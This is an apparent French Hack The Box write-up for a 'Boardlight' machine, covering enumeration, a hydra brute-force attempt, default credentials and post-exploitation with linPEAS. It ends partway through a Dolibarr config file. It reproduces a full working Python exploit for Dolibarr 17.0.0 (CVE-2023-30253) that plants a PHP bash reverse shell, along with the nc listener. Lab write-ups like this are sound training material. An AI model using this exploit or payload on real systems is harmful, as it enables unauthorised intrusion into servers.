Tout d'abord on commence par un scan.
```bash
nmap -sV -v 10.129.52.52
```

On voit qu'il y a deux ports d'ouverts:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: board.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La version d'Apache ne semble pas avoir de vulnérabilités connues.
Puisqu'il y a un serveur Apache, on scanne également les répertoires:
```bash
dirb http://10.129.52.52/
```
La page `/server-status` semble intéressant, mais nous n'y avons pas accès.
En accédant à http://10.129.52.52/, on se rend compte qu'il s'agit d'un site php.
Plusieurs liens (comme le login) ne semblent pas fonctionner.

Aucune requête POST n'apparaît dans sur le réseau lors de l'envoi d'un formulaire.
En regardant plus loin, voici un example de form:
```html
<form action="">
....
</form>
```
On constate que le champ `action` est vide.

Si on tente d'accéder à une page qui n'existe pas, par exemple `/login.php`, on obtient `File not found.`
On tente donc de faire du directory traversal pour afficher `/etc/passwd` mais sans succès, l'url est corrigée et on obtient `The requested URL was not found on this server.`.

Aucun cookie n'est visible.
La version de jQuery, `3.4.1` ne semble pas avoir de faille connues.

En cherchant .php dans le code source de la page un fichier `portfolio.php` qui est commenté.
Malheureusement accéder au fichier donne un `File not found.`

On continue l'énumération avec nikto mais rien de bien intéressant.
```bash
nikto -h http://10.129.52.52/

+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ 8074 requests: 0 error(s) and 4 item(s) reported on remote host
```

En désespoir de cause, on tente l'énumération des sous-domaines avec gobuster.
D'abord, il faut télécharger les listes de sous-domaines:
```bash
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
  && unzip SecList.zip \
  && rm -f SecList.zip
```

Puis, on lance l'énumération avec ffuf:
```bash
ffuf -w ./SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -mc 200 -fs 15949 -o ffuf_output.json -of json
```
On obtient le résultat suivant:

```json
{
  "commandline": "ffuf -w ./SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H Host: FUZZ.board.htb -mc 200 -fs 15949 -o ffuf_output.txt -of json",
  "time": "2024-07-26T17:05:30-05:00",
  "results": [
    {
      "input": {
        "FFUFHASH": "6790a48",
        "FUZZ": "crm"
      },
      "position": 72,
      "status": 200,
      "length": 6360,
      "words": 397,
      "lines": 150,
      "content-type": "text/html; charset=UTF-8",
      "redirectlocation": "",
      "scraper": {},
      "duration": 93789337,
      "resultfile": "",
      "url": "http://board.htb",
      "host": "crm.board.htb"
    }
  ],
  ....
}
```

On a donc trouvé l'hôte `crm.board.htb`.
Lorsqu'on accède à la page, on voit qu'il s'agit d'une page de login pour le CRM `Dolibarr 17.0.0`
En regardant sur `exploit-db.com` on trouve que la version `17.0.1` est vulnérable à une attaque XSS. Peut-être utile pour plus tard.

Avec ces informations en tête, on va tenter une attaque sur le login avec hydra.
Pour procéder, on va avoir besoin d'un example de requête de login. Nous allons donc l'intercepter avec burp.
```bash
token=f2d2a913edc0137d1066cb9907b3f382&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=-6&tz_string=America%2FChicago&dst_observed=1&dst_first=2024-03-10T01%3A59%3A00Z&dst_second=2024-11-3T01%3A59%3A00Z&screenwidth=2048&screenheight=861&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=admin&password=test
```
On reçoit comme réponse `Bad value for login or password`.

Une fois ces informations en main, on lance hydra:
```bash
sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -t 16 -o hydra_results.txt http-post-form://crm.board.htb/index.php?mainmenu=home:"token=f2d2a913edc0137d1066cb9907b3f382&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=-6&tz_string=America%2FChicago&dst_observed=1&dst_first=2024-03-10T01%3A59%3A00Z&dst_second=2024-11-03T01%3A59%3A00Z&screenwidth=2048&screenheight=861&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=^USER^&password=^PASS^:F=Bad"
```
Mais on se rend vite compte qu'un cookie unique est généré comme protection contre le brute-force pour chaque session car on obtient la réponse: `Security token has expired, so action has been canceled. Please try again.`

On va aussi scanner les répertoires du nouveau sous-domaine avec dirb:
```bash
dirb http://crm.board.htb/
```

On va trouver quelques fichiers intéressants, notamment:

http://crm.board.htb/conf
```html
Forbidden

You don't have permission to access this resource.
```

http://crm.board.htb/api/index.php
```bash
Module Api must be enabled.

To activate modules, go on setup Area (Home->Setup->Modules).
```

http://crm.board.htb/install/phpinfo.php
```bash
The application tried to self-upgrade, but the install/upgrade pages have been disabled for security (by the existence of a lock file install.lock in the dolibarr documents directory).
If an upgrade is in progress, please wait. If not, click on the following link. If you always see this same page, you must remove/rename the file install.lock in the documents directory.
Click here to go to your application
```

Et la page dans le répertoire `public` nous redirige vers une page d'erreur 404 et les autres pages demandent un login.

En fouillant un peu sur le web, on trouve le CVE suivant pour obtenir un reverse shell, mais il nécessite d'avoir les credentials:
```bash
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253

#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import http.client
import time
import argparse
import uuid

auth_headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
    "Connection": "close"
}

def remove_http_prefix(url: str) -> str:
    if url.startswith("http://"):
        return url[len("http://"):]
    elif url.startswith("https://"):
        return url[len("https://"):]
    else:
        return url

def get_csrf_token(url, headers):
    csrf_token = ""
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")
        meta_tag = soup.find("meta", attrs={"name": "anti-csrf-newtoken"})

        if meta_tag:
            csrf_token = meta_tag.get("content")
        else:
            print("[!] CSRF token not found")
    else:
        print("[!] Failed to retrieve the page. Status code:", response.status_code)

    return csrf_token

def auth(pre_login_token, username, password, auth_url, auth_headers):
    login_payload = {
        "token": pre_login_token,
        "actionlogin": "login",
        "loginfunction": "loginfunction",
        "backtopage": "",
        "tz": "-5",
        "tz_string": "America/New_York",
        "dst_observed": "1",
        "dst_first": "2024-03-10T01:59:00Z",
        "dst_second": "2024-11-3T01:59:00Z",
        "screenwidth": "1050",
        "screenheight": "965",
        "dol_hide_topmenu": "",
        "dol_hide_leftmenu": "",
        "dol_optimize_smallscreen": "",
        "dol_no_mouse_hover": "",
        "dol_use_jmobile": "",
        "username": username,
        "password": password
    }

    requests.post(auth_url, data=login_payload, headers=auth_headers, allow_redirects=True)
    
def create_site(hostname, login_token, site_name, http_connection):
    create_site_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryKouJvCUT1lX8IVE6",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    create_site_body = (
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "addsite\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n"
        "-1\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_REF\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_LANG\"\r\n\r\n"
        "en\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_OTHERLANG\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_DESCRIPTION\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"virtualhost\"\r\n\r\n"
        "http://" + site_name + ".localhost\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"addcontainer\"\r\n\r\n"
        "Create\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6--\r\n"
    )

    http_connection.request("POST", "/website/index.php", create_site_body, create_site_headers)
    http_connection.getresponse()

def create_page(hostname, login_token, site_name, http_connection):
    create_page_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryur7X26L0cMS2mE5w",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    create_page_body = (
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "addcontainer\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"pageidbis\"\r\n\r\n"
        "-1\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"pageid\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"radiocreatefrom\"\r\n\r\n"
        "checkboxcreatemanually\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_TYPE_CONTAINER\"\r\n\r\n"
        "page\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"sample\"\r\n\r\n"
        "empty\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_TITLE\"\r\n\r\n"
        "TEST\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_PAGENAME\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_ALIASALT\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_DESCRIPTION\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_IMAGE\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_KEYWORDS\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_LANG\"\r\n\r\n"
        "0\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_AUTHORALIAS\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreation\"\r\n\r\n"
        "05/25/2024\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationday\"\r\n\r\n"
        "25\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationmonth\"\r\n\r\n"
        "05\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationyear\"\r\n\r\n"
        "2024\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationhour\"\r\n\r\n"
        "15\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationmin\"\r\n\r\n"
        "25\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationsec\"\r\n\r\n"
        "29\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader_x\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader_y\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"addcontainer\"\r\n\r\n"
        "Create\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"externalurl\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"grabimages\"\r\n\r\n"
        "1\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"grabimagesinto\"\r\n\r\n"
        "root\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w--\r\n"
    )

    http_connection.request("POST", "/website/index.php", create_page_body, create_page_headers)
    http_connection.getresponse()

def edit_page(hostname, login_token, site_name, lhost, lport, http_connection):
    edit_page_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryYWePyybXc70N8CPm",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    edit_page_body = (
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "updatesource\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"pageid\"\r\n\r\n"
        "2\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"update\"\r\n\r\n"
        "Save\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT_x\"\r\n\r\n"
        "16\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT_y\"\r\n\r\n"
        "2\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT\"\r\n\r\n"
        "<!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable=\"true\" if you want to use the inline editor for the content -->\n"
        "<section id=\"mysection1\" contenteditable=\"true\">\n"
        "    <?pHp system(\"bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'\"); ?>\n"
        "</section>\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm--\r\n"
    )

    http_connection.request("POST", "/website/index.php", edit_page_body, edit_page_headers)
    http_connection.getresponse()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="---[Reverse Shell Exploit for Dolibarr <= 17.0.0 (CVE-2023-30253)]---", usage= "python3 exploit.py <TARGET_HOSTNAME> <USERNAME> <PASSWORD> <LHOST> <LPORT>\r\nexample: python3 exploit.py http://example.com login password 127.0.0.1 9001")
    parser.add_argument("hostname", help="Target hostname")
    parser.add_argument("username", help="Username of Dolibarr ERP/CRM")
    parser.add_argument("password", help="Password of Dolibarr ERP/CRM")
    parser.add_argument("lhost", help="Listening host for reverse shell")
    parser.add_argument("lport", help="Listening port for reverse shell")

    args = parser.parse_args()
    min_required_args = 5
    if len(vars(args)) != min_required_args:
        parser.print_usage()
        exit()

    site_name = str(uuid.uuid4()).replace("-","")[:10]
    base_url = args.hostname + "/index.php"
    auth_url = args.hostname + "/index.php?mainmenu=home"
    admin_url = args.hostname + "/admin/index.php?mainmenu=home&leftmenu=setup&mesg=setupnotcomplete"
    call_reverse_shell_url = args.hostname + "/public/website/index.php?website=" + site_name + "&pageref=" + site_name

    pre_login_token = get_csrf_token(base_url, auth_headers)

    if pre_login_token == "":
        print("[!] Cannot get pre_login_token, please check the URL") 
        exit()

    print("[*] Trying authentication...")
    print("[**] Login: " + args.username)
    print("[**] Password: " + args.password)

    auth(pre_login_token, args.username, args.password, auth_url, auth_headers)
    time.sleep(1)

    login_token = get_csrf_token(admin_url, auth_headers)

    if login_token == "":
        print("[!] Cannot get login_token, please check the URL") 
        exit()

    http_connection = http.client.HTTPConnection(remove_http_prefix(args.hostname))

    print("[*] Trying created site...")
    create_site(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying created page...")
    create_page(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection")
    edit_page(args.hostname, login_token, site_name, args.lhost, args.lport, http_connection)

    http_connection.close()
    time.sleep(1)
    requests.get(call_reverse_shell_url)

    print("[!] If you have not received the shell, please check your login and password")
```
À court d'idée, on tente de se logger avec des credentials par défaut qui sont populaire. On fini par trouver `admin`  `admin` comme login.

Maintenant qu'on a les credentials, ont peut exécuter le CVE pour obtenir un reverse shell.
Pour se faire, on démarre d'abord netcat:
```bash
nc -lvnp 9001
```

Puis, on lance le script:
```bash
python3 exploit.py http://crm.board.htb admin admin 10.10.14.252 9001
```

Une connexion est établie avec netcat:
```bash
listening on [any] 9001 ...
connect to [10.10.14.252] from (UNKNOWN) [10.129.52.52] 43820
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
```

On fait un peu de reconnaissance:
```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ ls
ls
index.php
styles.css.php
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cd ..
cd ..
www-data@boardlight:~/html/crm.board.htb/htdocs/public$ cd /home
cd /home
www-data@boardlight:/home$ ls
ls
larissa
www-data@boardlight:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root    root    4096 May 17 01:04 .
drwxr-xr-x 19 root    root    4096 May 17 01:04 ..
drwxr-x--- 15 larissa larissa 4096 May 17 01:04 larissa
```
Il faut donc probablement trouver un moyen de devenir `larissa`.

On va utiliser linPEAS pour trouver des vulnérabilités pour l'escalation de privilège. Pour le transférer sur la machine, on va télécharger le script sur notre machine et le servir:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
Par la suite, depuis le serveur, on va télécharger linPEAS.sh:
```bash
cd /tmp
wget 10.10.14.252:8080/linpeas.sh
chmod +x linpeas.sh
```

Puis, on va l'exécuter:
```bash
./linpeas.sh
....
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 May 13 23:40 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 4 www-data www-data 4096 Mar  4  2023 /var/www/html/crm.board.htb/.github

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Mar 19 07:35 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Mar 19 07:35 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 27 Sep 17  2023 /etc/apache2/sites-enabled/php.conf -> ../sites-available/php.conf
lrwxrwxrwx 1 root root 28 Sep 17  2023 /etc/apache2/sites-enabled/site.conf -> ../sites-available/site.conf
lrwxrwxrwx 1 root root 32 Mar 19 07:35 /etc/apache2/sites-enabled/dolibarr.conf -> ../sites-available/dolibarr.conf
lrwxrwxrwx 1 root root 29 Mar 19 00:29 /etc/apache2/sites-enabled/board.conf -> ../sites-available/board.conf

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 44K Feb  6 04:49 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Apr  9 08:34 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Apr  9 08:34 /usr/bin/su
-rwsr-xr-x 1 root root 84K Feb  6 04:49 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  9 08:34 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Feb  6 04:49 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 67K Feb  6 04:49 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6 04:49 /usr/bin/chsh
-rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root mail 23K Apr  7  2021 /usr/libexec/camel-lock-helper-1.2
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root mail 15K Aug 26  2019 /usr/bin/mlock
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K Feb  6 04:49 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 83K Feb  6 04:49 /usr/bin/chage
-rwxr-sr-x 1 root ssh 343K Jan  2  2024 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write

╔══════════╣ Analyzing SSH Files (limit 70)
-rw-r--r-- 1 root root 177 May  2 05:43 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 97 May  2 05:43 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 569 May  2 05:43 /etc/ssh/ssh_host_rsa_key.pub

Port 22
ListenAddress 0.0.0.0
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes

```
Rien d'intéressant au niveau des cronjobs.
Il y a une base de données MySQL.
Root peut se connecter via SSH.

En allant voir la documentation de Dolibarr sur GitHub, on remaque que le fichier `htdocs/conf/php.conf` pourrait contenir des valeurs sensibles.
On décide donc de l'afficher:
```bash
www-data@boardlight:~/html/crm.board.htb$ nano htdocs/conf/conf.php
nano htdocs/conf/conf.php
Error opening terminal: unknown.
www-data@boardlight:~/html/crm.board.htb$ cat htdocs/conf/conf.php
cat htdocs/conf/conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
